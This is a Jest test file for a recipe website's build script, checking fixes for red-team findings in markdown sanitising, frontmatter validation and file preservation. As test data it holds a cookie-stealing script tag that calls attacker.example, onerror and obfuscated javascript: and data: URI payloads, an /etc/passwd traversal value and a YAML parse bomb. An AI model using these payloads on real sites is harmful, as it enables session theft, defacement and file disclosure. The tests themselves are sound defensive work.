/**
 * Tests for scripts/preserve-build.js security fixes.
 *
 * scripts/preserve-build.js is a plain ESM .js file (the project's
 * "type": "module" build script, run via `node scripts/preserve-build.js`,
 * never via `astro build` directly). Jest's CJS-based transform can't load
 * raw ESM `.js` files directly, so these tests exercise the real script via
 * Node subprocesses — the same way it actually runs in production — rather
 * than duplicating its logic in the test.
 *
 * Covers:
 *  - RT-2026-07-30-01: stored XSS via unsanitised recipe markdown.
 *  - RT-2026-07-30-02: a build failure permanently deleting the deploy
 *    repo's .git/CNAME/.nojekyll.
 */

import { execFileSync } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

const projectRoot = path.resolve(__dirname, '../..');
const scriptPath = path.join(projectRoot, 'scripts/preserve-build.js');

/** Runs a small ESM snippet that imports preserve-build.js and prints JSON. */
function runSnippet(code: string): any {
  const output = execFileSync('node', ['--input-type=module', '-e', code], {
    cwd: projectRoot,
    encoding: 'utf8',
  });
  const lastLine = output.trim().split('\n').pop() as string;
  return JSON.parse(lastLine);
}

describe('sanitizeMarkdownContent (RT-2026-07-30-01)', () => {
  test('neutralises the exact stored-XSS payload from the red-team repro', () => {
    const payload =
      "# Recipe\n\n<script>fetch('https://attacker.example/steal?d='+document.cookie)</script>" +
      "<img src=x onerror=\"document.body.innerHTML='<h1>DEFACED</h1>'\">";

    const result = runSnippet(`
      import { sanitizeMarkdownContent } from ${JSON.stringify(scriptPath)};
      const payload = ${JSON.stringify(payload)};
      const sanitized = sanitizeMarkdownContent(payload);
      console.log(JSON.stringify({
        sanitized,
        containsScriptTag: sanitized.includes('<script>'),
        containsOnerror: /<img[^>]*onerror=/.test(sanitized),
      }));
    `);

    expect(result.containsScriptTag).toBe(false);
    expect(result.containsOnerror).toBe(false);
    // The payload text itself is preserved (as inert text), not deleted.
    expect(result.sanitized).toContain('DEFACED');
  });

  test('leaves ordinary recipe markdown untouched', () => {
    const normal = '# Autumn Salad\n\n## Ingredients\n- Beetroots\n- Mushrooms\n';
    const result = runSnippet(`
      import { sanitizeMarkdownContent } from ${JSON.stringify(scriptPath)};
      console.log(JSON.stringify({ sanitized: sanitizeMarkdownContent(${JSON.stringify(normal)}) }));
    `);
    expect(result.sanitized).toBe(normal);
  });
});

describe('sanitizeMarkdownContent neutralises unsafe link/image URL schemes (RT-2026-09-06-01 / RT-2026-07-30-01 reopened)', () => {
  // Exact repro payloads from the red-team re-verification pass.
  const cases: Array<[string, string]> = [
    ['plain javascript: link', "[CLICK-ME-JSURI](javascript:alert(document.domain))"],
    ['javascript: image', '![imgjsuri](javascript:alert(1))'],
    ['entity-obfuscated javascript:', "[jsuri-obfuscated](java&#115;cript:alert('obf'))"],
    ['data: URI', '[datauri](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
    ['NUL-byte-obfuscated javascript:', '[nulled](java\x00script:alert(1))'],
    ['reference-style definition', '[refstyle-def][1]\n\n[1]: javascript:alert(1)'],
  ];

  test.each(cases)('%s is neutralised, not left live', (_label, payload) => {
    const result = runSnippet(`
      import { sanitizeMarkdownContent } from ${JSON.stringify(scriptPath)};
      const sanitized = sanitizeMarkdownContent(${JSON.stringify(payload)});
      console.log(JSON.stringify({
        sanitized,
        containsJsScheme: /javascript:/i.test(sanitized),
        containsDataScheme: /data:/i.test(sanitized),
      }));
    `);
    expect(result.containsJsScheme).toBe(false);
    expect(result.containsDataScheme).toBe(false);
  });

  test('does not touch safe schemes (http/https/mailto) or relative links', () => {
    const safe =
      '[normal](https://example.com/page)\n\n' +
      '[secure](http://example.com/page)\n\n' +
      '[email](mailto:a@b.com)\n\n' +
      '[relative](./other-post)\n\n' +
      '[anchor](#section)\n';
    const result = runSnippet(`
      import { sanitizeMarkdownContent } from ${JSON.stringify(scriptPath)};
      console.log(JSON.stringify({ sanitized: sanitizeMarkdownContent(${JSON.stringify(safe)}) }));
    `);
    expect(result.sanitized).toBe(safe);
  });

  test('end-to-end: rendered HTML contains no live javascript:/data: href or src', async () => {
    const payload =
      "[CLICK-ME-JSURI](javascript:alert(document.domain))\n\n" +
      '![imgjsuri](javascript:alert(1))\n\n' +
      "[jsuri-obfuscated](java&#115;cript:alert('obf'))\n\n" +
      '[datauri](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)\n';

    const output = execFileSync(
      'node',
      [
        '--input-type=module',
        '-e',
        `
        import { sanitizeMarkdownContent } from ${JSON.stringify(scriptPath)};
        import { createSatteriMarkdownProcessor } from '@astrojs/markdown-satteri';
        const processor = await createSatteriMarkdownProcessor();
        const sanitized = sanitizeMarkdownContent(${JSON.stringify(payload)});
        const rendered = await processor.render(sanitized);
        console.log(JSON.stringify({ html: rendered.code }));
        `,
      ],
      { cwd: projectRoot, encoding: 'utf8' }
    );
    const { html } = JSON.parse(output.trim().split('\n').pop() as string);

    expect(html).not.toMatch(/href="javascript:/i);
    expect(html).not.toMatch(/src="javascript:/i);
    expect(html).not.toMatch(/href="data:/i);
  });
});

describe('validateRecipeFrontmatter (RT-2026-07-30-02)', () => {
  const goodFrontmatter =
    "---\n" +
    "layout: ../../layout/Post/MarkdownPostLayout.astro\n" +
    "title: 'Test Recipe'\n" +
    "pubDate: '2023-10-14'\n" +
    "description: 'A test recipe'\n" +
    "author: 'Test Author'\n" +
    "tags: [\"Autumn\", \"Light course\"]\n" +
    "---\n" +
    "Body text\n";

  function validate(content: string): any {
    return runSnippet(`
      import { validateRecipeFrontmatter } from ${JSON.stringify(scriptPath)};
      console.log(JSON.stringify(validateRecipeFrontmatter(${JSON.stringify(content)}, 'test.md')));
    `);
  }

  test('accepts well-formed frontmatter', () => {
    expect(validate(goodFrontmatter).valid).toBe(true);
  });

  test('rejects the exact malformed tag from the red-team repro (path traversal)', () => {
    const bad = goodFrontmatter.replace('"Light course"', '"../../../../PWNED-TRAVERSAL"');
    const result = validate(bad);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/tag/i);
  });

  test('rejects a stray-quote tag (matches the committed `burgers"` bug)', () => {
    const bad = goodFrontmatter.replace('"Light course"', 'burgers"');
    const result = validate(bad);
    expect(result.valid).toBe(false);
  });

  test('rejects frontmatter missing a required field (e.g. pubDate)', () => {
    const bad = goodFrontmatter.replace(/pubDate:.*\n/, '');
    const result = validate(bad);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/pubDate/);
  });

  test('rejects a path-traversal layout value (RT-2026-09-06-02 (a) repro)', () => {
    const bad = goodFrontmatter.replace(
      'layout: ../../layout/Post/MarkdownPostLayout.astro',
      'layout: ../../../../../../../../etc/passwd'
    );
    const result = validate(bad);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/layout/i);
  });

  test('rejects any layout value outside the allow-list', () => {
    const bad = goodFrontmatter.replace(
      'layout: ../../layout/Post/MarkdownPostLayout.astro',
      'layout: ../../layout/BaseLayout.astro'
    );
    const result = validate(bad);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/layout/i);
  });

  test('rejects oversized content before YAML parsing (RT-2026-09-06-02 (b) repro)', () => {
    const result = runSnippet(`
      import { validateRecipeFrontmatter, MAX_RECIPE_FILE_SIZE_BYTES } from ${JSON.stringify(scriptPath)};
      const oversized = 'x'.repeat(MAX_RECIPE_FILE_SIZE_BYTES + 1);
      const start = Date.now();
      const result = validateRecipeFrontmatter(oversized, 'huge.md');
      console.log(JSON.stringify({ ...result, elapsedMs: Date.now() - start }));
    `);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/size/i);
    // Rejected on a fast length check, not after an expensive parse attempt.
    expect(result.elapsedMs).toBeLessThan(1000);
  });

  test('an !!omap YAML payload no longer shows quadratic parse time', () => {
    // Reproduces the red-team's GHSA-5p4m-2wfm-xmqj measurement at a size
    // that would previously take single-digit seconds (quadratic growth);
    // with the js-yaml override in place this should stay well under a
    // second.
    const result = runSnippet(`
      import { validateRecipeFrontmatter } from ${JSON.stringify(scriptPath)};
      let entries = '';
      for (let i = 0; i < 10000; i++) entries += \`  - k\${i}: v\\n\`;
      const content = '---\\nlayout: ../../layout/Post/MarkdownPostLayout.astro\\ntitle: t\\npubDate: 2024-01-01\\nauthor: a\\ndescription: d\\nomap: !!omap\\n' + entries + '---\\nbody\\n';
      const start = Date.now();
      validateRecipeFrontmatter(content, 'omap-bomb.md');
      console.log(JSON.stringify({ elapsedMs: Date.now() - start }));
    `);
    expect(result.elapsedMs).toBeLessThan(2000);
  });
});

describe('preserved files survive a failed build (RT-2026-07-30-02 end-to-end)', () => {
  jest.setTimeout(30000);

  let scratchDir: string;

  beforeEach(() => {
    scratchDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ags-preserve-build-'));

    // Minimal astro.config.mjs sibling: preserve-build.js resolves
    // '../astro.config.mjs' relative to its own location, so it must be
    // copied alongside the script inside the scratch project.
    fs.mkdirSync(path.join(scratchDir, 'scripts'), { recursive: true });
    fs.copyFileSync(scriptPath, path.join(scratchDir, 'scripts/preserve-build.js'));
    fs.writeFileSync(
      path.join(scratchDir, 'astro.config.mjs'),
      "export default { outDir: './out' };\n"
    );

    // node_modules is required for the script's `gray-matter` / `node-fetch`
    // imports; symlink the real one instead of duplicating it.
    fs.symlinkSync(
      path.join(projectRoot, 'node_modules'),
      path.join(scratchDir, 'node_modules'),
      'dir'
    );

    // Seed a fake "deploy repo" output directory with the files that must
    // be preserved across a build.
    const outDir = path.join(scratchDir, 'out');
    fs.mkdirSync(path.join(outDir, '.git'), { recursive: true });
    fs.writeFileSync(path.join(outDir, '.git', 'HEAD'), 'ref: refs/heads/main\n');
    fs.writeFileSync(path.join(outDir, 'CNAME'), 'benjamindegryse.be\n');
    fs.writeFileSync(path.join(outDir, '.nojekyll'), '');
  });

  afterEach(() => {
    fs.rmSync(scratchDir, { recursive: true, force: true });
  });

  test('a failing "build" that also wipes outDir (simulating astro) still leaves .git/CNAME/.nojekyll restored', () => {
    const outDir = path.join(scratchDir, 'out');

    // Simulates what a real `astro build` failure looks like: outDir gets
    // emptied of the preserved files (astro clears outDir before rendering)
    // and the command exits non-zero (a render crash). Before the fix,
    // runAstroBuild() called process.exit(1) here, which skipped
    // restorePreservedFiles() entirely and left the deploy repo's .git gone.
    const failingBuildCommand = `rm -rf out/.git out/CNAME out/.nojekyll; exit 1`;

    let threw = false;
    try {
      execFileSync('node', ['scripts/preserve-build.js'], {
        cwd: scratchDir,
        env: { ...process.env, PRESERVE_BUILD_COMMAND: failingBuildCommand },
        stdio: 'pipe',
      });
    } catch (error) {
      // A failed build is expected to make the overall process exit
      // non-zero; that alone is not the bug under test.
      threw = true;
    }

    expect(threw).toBe(true);
    expect(fs.existsSync(path.join(outDir, '.git', 'HEAD'))).toBe(true);
    expect(fs.existsSync(path.join(outDir, 'CNAME'))).toBe(true);
    expect(fs.existsSync(path.join(outDir, '.nojekyll'))).toBe(true);
  });

  test('a successful build leaves preserved files in place and exits 0', () => {
    const outDir = path.join(scratchDir, 'out');

    execFileSync('node', ['scripts/preserve-build.js'], {
      cwd: scratchDir,
      env: { ...process.env, PRESERVE_BUILD_COMMAND: 'true' },
      stdio: 'pipe',
    });

    expect(fs.existsSync(path.join(outDir, '.git', 'HEAD'))).toBe(true);
    expect(fs.existsSync(path.join(outDir, 'CNAME'))).toBe(true);
    expect(fs.existsSync(path.join(outDir, '.nojekyll'))).toBe(true);
  });
});
